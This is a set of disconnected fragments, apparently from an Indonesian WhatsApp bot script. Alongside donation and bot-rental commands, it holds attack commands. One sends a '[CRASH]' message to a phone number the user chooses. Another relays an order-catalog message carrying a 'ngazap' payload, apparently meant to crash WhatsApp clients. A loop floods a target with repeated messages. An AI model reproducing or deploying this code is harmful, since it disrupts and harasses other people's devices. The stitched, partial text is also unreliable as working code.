...
*Silahkan* @${m.mentionedJid[0].split`@`[0]} *untuk ketik terima/tolak*`
	    ...
	    case 'donasi': case 'sewabot': case 'sewa': case 'buypremium': case 'donate': {
                naze.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/7a41194d88010c3fd8871.jpg' }, caption: `*${ucapanWaktu} Kak ${m.pushName}*\n\n *Jika ingin berdonasi silahkan chat no di bawah*\n\n*Jika ingin sewa bot atau premium*\n*Silahkan Chat Owner*\n\n*Atau klik link dibawah ini*\n_https://saweria.co/\n\n*Atau Transfer via*\n- *Gopay Dana Ovo Qris ShopeePay*\n chat nomor berikut : wa.me/6281349277979\n\n_Terima kasih_` }, { quoted: m })
            }
            break
            case 'sc': case 'script': {
                m.reply('Check Youtube https://youtube.com/channel/UCMfqoj1vq3XDUKjlkL_fTKA')
            }
            break		 
            case 'chat': {
...
naze.sendMessage(m.chat, {text:"LOADING...."},{quoted: m})
naze.sendMessage(`${text}@s.whatsapp.net`, {text:"DAPA GANZ [CRASH]"},{quoted: doc})
...
"status": "INQUIRY",
"surface": "CATALOG",
"message": `Â© DapaZX${ngazap(prefix)}`,
"jpegThumbnail":fs.readFileSync('./image/pict.jpg'),
"orderTitle": `Â© DapaZX${ngazap(prefix)}`,
...
naze.relayMessage(m.chat, order.message, { messageId: order.key.id })
}
break
...
naze.sendMessage(Pe, {text: "Diputusin Pacar"}, {quoted: doc})
await sleep(20)
naze.sendMessage(Pe, {text: "Diputusin Pacar"}, {quoted: doc})
await sleep(20)
naze.sendMessage(Pe, {text: "Diputusin Pacar"}, {quoted: doc})
